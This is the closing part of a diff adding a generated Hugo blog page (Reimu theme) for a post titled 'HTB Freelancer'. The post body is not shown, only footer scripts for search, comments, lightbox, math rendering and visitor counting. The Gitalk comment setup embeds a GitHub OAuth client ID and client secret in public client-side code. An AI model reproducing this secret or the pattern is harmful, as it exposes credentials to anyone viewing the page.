+          "hits_empty": '未发现与 「${query}」相关内容',
+          "hits_stats": '找到${hits}条结果（用时 ${time} ms）'
+        }
+      }
+    };
+  </script><script
+    src="https://npm.webcache.cn/algoliasearch@4.17.1/dist/algoliasearch-lite.umd.js"
+    deferintegrity="sha384-xvLS0jfKuoREs7pqkRI/OI8GcqohO5S&#43;jQz7ZBtQXnsXmD&#43;9jDOOY4cL6dCPzlrk" crossorigin="anonymous"></script><script
+    src="https://npm.webcache.cn/@reimujs/instantsearch.js@4.57.0-beta.1/dist/instantsearch.production.min.js"
+    deferintegrity="sha384-aagKMe8nkqaP2DYQc8kkYOL5l&#43;M5Q2WH/Uhr4teOh0Ybp0RZj0kUSDm45qPikMjK" crossorigin="anonymous"></script><script src="/js/algolia_search.js" ></script><script
+    src="https://npm.webcache.cn/mouse-firework@0.1.1/dist/index.umd.js"
+    integrity="sha384-8LyaidD9GPxQQgLJO/WRw/O2h3BoNq/ApI/ecpvM6RsrCz2qP2ppBXUKihP4V/2d" crossorigin="anonymous"></script><script>
+  if (! false  || !window.matchMedia('(max-width: 768px)').matches) {
+    if (window.firework) {
+      const options = JSON.parse("{\"excludeelements\":[\"a\",\"button\"],\"particles\":[{\"colors\":[\"var(--red-1)\",\"var(--red-2)\",\"var(--red-3)\",\"var(--red-4)\"],\"duration\":[1200,1800],\"easing\":\"easeOutExpo\",\"move\":[\"emit\"],\"number\":20,\"shape\":\"circle\",\"shapeOptions\":{\"alpha\":[0.3,0.5],\"radius\":[16,32]}},{\"colors\":[\"var(--red-0)\"],\"duration\":[1200,1800],\"easing\":\"easeOutExpo\",\"move\":[\"diffuse\"],\"number\":1,\"shape\":\"circle\",\"shapeOptions\":{\"alpha\":[0.2,0.5],\"lineWidth\":6,\"radius\":20}}]}");
+      options.excludeElements = options.excludeelements;
+      delete options.excludeelements;
+      window.firework(options);
+    }
+  }
+</script>
+
+<div id="lazy-script">
+  <div><script data-pjax>
+        window.REIMU_POST = {
+          author: "Ya1orin",
+          title: "HTB Freelancer",
+          url: "http:\/\/localhost:1313\/post\/htb-freelancer\/",
+          description: "HackTheBox篇之Freelancer",
+          cover: "http:\/\/localhost:1313\/images\/banner.webp",
+        };
+      </script><script src="/js/insert_highlight.js" data-pjax></script><script type="module" data-pjax>const PhotoSwipeLightbox = (await safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js", "sha384-DiL6M\/gG\u002bwmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF\/N6lrZi\/")).default;const initPswp = (gallery, children) => {
+          if (_$$(`${gallery} ${children}`).length > 0) {
+            new PhotoSwipeLightbox({
+              gallery,
+              children,pswpModule: () => safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8\u002boTJ7m3DfYEWX1fu1scuS4\u002bs")}).init();
+          }
+        }
+        const pswp = () => {
+          initPswp('.article-entry', 'a.article-gallery-item');
+          initPswp('.article-gallery', 'a.article-gallery-item');
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script><script data-pjax>
+  var loadScript = (src, integrity) => {
+    const script = document.createElement('script');
+    script.src = src;
+    if (integrity) script.integrity = integrity;
+    script.crossOrigin = 'anonymous';
+    return script;
+  };
+  var commentConfigKeys = ['valine', 'waline', 'twikoo', 'gitalk', 'giscus'];
+  var commentConfig = {gitalk: {
+      enable: true,
+      load: () => {
+        const container = document.querySelector('.gitalk-comment');
+        if (!container) return;
+        container.style.display = 'block';
+
+        const script = loadScript(
+          'https:\/\/npm.webcache.cn\/gitalk@1.8.0\/dist\/gitalk.min.js',
+          !'webcache|gitalk@1.8.0\/dist\/gitalk.min.js'.startsWith('local') ? 'sha384-kspnZUWBoSWwoJHa0hBCXYbHGbhvU\/lcEH5O8eVbSDhbPwsiVUTp\/aGX\/z\/5EuMA' : undefined
+        );
+        script.onload = () => {
+          if ( false ) {
+            
+            const md5Script = loadScript(
+              'https:\/\/npm.webcache.cn\/blueimp-md5@2.19.0\/js\/md5.min.js',
+              !'webcache|blueimp-md5@2.19.0\/js\/md5.min.js'.startsWith('local') ? 'sha384-JmVtRz6RWiXnA14QbIOJzPuU3MidULOpBP66deeLLyyoF4Tr\/gZlbkHkL6vTthxH' : undefined
+            );
+            md5Script.onload = initGitalk;
+            document.head.appendChild(md5Script);
+          } else {
+            
+            initGitalk();
+          }
+        };
+        document.head.appendChild(script);
+
+        function initGitalk() {
+          let gitalk = new Gitalk({
+            clientID: 'Ov23li64Bz4egFDpBVAa',
+            clientSecret: 'ff0e7ea9d99ed40adbfcb4bf88ff2b95918d9dd7',
+            repo: 'Blog-comment',
+            owner: 'Ya1orin',
+            admin: JSON.parse("\"Ya1orin\""),
+            id: location.pathname,
+            distractionFreeMode: false,
+            language: document.documentElement.lang || 'en',
+          });
+          gitalk.render('gitalk-comment');
+        }
+      }
+    },};
+  commentConfig.enable = commentConfigKeys.some(key => commentConfig?.[key]?.enable);
+
+  var defaultComment = '';
+  if (commentConfig.enable) {
+    
+    var savedCommentType = localStorage.getItem('commentType');
+    
+    
+    if (savedCommentType) {
+      if (commentConfig[savedCommentType]?.enable) {
+        defaultComment = savedCommentType;
+      }
+    }
+    
+    
+    if (!defaultComment) {
+      var configDefault = 'gitalk';
+      if (commentConfig[configDefault]?.enable) {
+        defaultComment = configDefault;
+      }
+    }
+    
+    
+    if (!defaultComment) {
+      defaultComment = commentConfigKeys.find(sys => commentConfig?.[sys]?.enable) || '';
+    }
+  }
+
+  function loadComments() {
+    if (!commentConfig.enable) return;
+    
+    const loadedComments = {
+      valine: false,
+      waline: false,
+      twikoo: false,
+      gitalk: false,
+      giscus: false
+    };
+
+    
+    const hideAllComments = () => {
+      const commentContainers = document.querySelectorAll('.comment');
+      commentContainers.forEach(container => {
+        container.style.display = 'none';
+      });
+    };
+
+    
+    const loadCommentSystem = (type) => {
+      if (loadedComments[type]) {
+        
+        document.querySelector(`.${type}-comment`).style.display = 'block';
+        return;
+      }
+
+      
+      commentConfig[type]?.load();
+      loadedComments[type] = true;
+    };
+
+    
+    const changeActiveCommentItems = (item) => {
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let i = 0; i < commentItems.length; i++) {
+        commentItems[i].classList.remove('active');
+      }
+      item.classList.add('active');
+
+      
+      const commentType = item.getAttribute('data-selector');
+
+      
+      hideAllComments();
+
+      
+      loadCommentSystem(commentType);
+    };
+
+    const commentInit = () => {
+      
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let item of commentItems) {
+        item.addEventListener('click', () => {
+          
+          const commentType = item.getAttribute('data-selector');
+          window.localStorage.setItem('commentType', commentType);
+          
+          changeActiveCommentItems(item);
+        });
+      }
+
+      
+      if (defaultComment) {
+        const defaultSelectorItem = document.querySelector(`[data-selector="${defaultComment}"]`);
+        if (!defaultSelectorItem) return;
+        defaultSelectorItem.style.display = 'block';
+        defaultSelectorItem.classList.add('active');
+        loadCommentSystem(defaultComment);
+      }
+    }
+
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', commentInit);
+    } else {
+      commentInit();
+    }
+  };
+  loadComments();
+</script><script
+    src="https://npm.webcache.cn/katex@0.16.24/dist/katex.min.js"
+    data-pjaxintegrity="sha384-MWNUH0WmtsYGhn2cbH6ELRCbf9LG3QDqCC&#43;gqPB3IBNO35xjZK3Ejb6oONRpDbPg" crossorigin="anonymous"></script><script
+    src="https://npm.webcache.cn/katex@0.16.24/dist/contrib/auto-render.min.js"
+    data-pjaxintegrity="sha384-hCXGrW6PitJEwbkoStFjeJxv&#43;fSOOQKOPbJxSfM6G5sWZjAyWhXiTIIAmQqnlLlh" crossorigin="anonymous"></script><script data-pjax>
+          var renderMath = () => {
+            if (!window.renderMathInElement) return;
+            window.renderMathInElement(_$("article"), {
+              delimiters: [
+                { left: "$$", right: "$$", display: true },
+                { left: "\\[", right: "\\]", display: true },
+                { left: "$", right: "$", display: false },
+                { left: "\\(", right: "\\)", display: false },
+              ],
+            });
+          };
+          if (document.readyState === "loading") {
+            document.addEventListener("DOMContentLoaded", renderMath, { once: true });
+          } else {
+            renderMath();
+          }
+        </script></div>
+</div><script
+    src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js"
+    asyncintegrity="sha384-0M75wtSkhjIInv4coYlaJU83&#43;OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id&#43;S" crossorigin="anonymous"></script><script>
+    if ('serviceWorker' in navigator) {
+      navigator.serviceWorker.getRegistrations().then((registrations) => {
+        for (let registration of registrations) {
+          registration.unregister();
+        }
+      });
+    }
+  </script><script>
+  const reimuCopyright = String.raw`
+   ______     ______     __     __    __     __  __    
+  /\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+  \ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+   \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+    \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                    
+  `;
+  console.log(String.raw`%c ${reimuCopyright}`, "color: #ff5252;");
+  console.log(
+    "%c Theme.Reimu" + " %c https://github.com/D-Sketon/hugo-theme-reimu ",
+    "color: white; background: #ff5252; padding:5px 0;",
+    "padding:4px;border:1px solid #ff5252;",
+  );
+</script></body>
+</html>
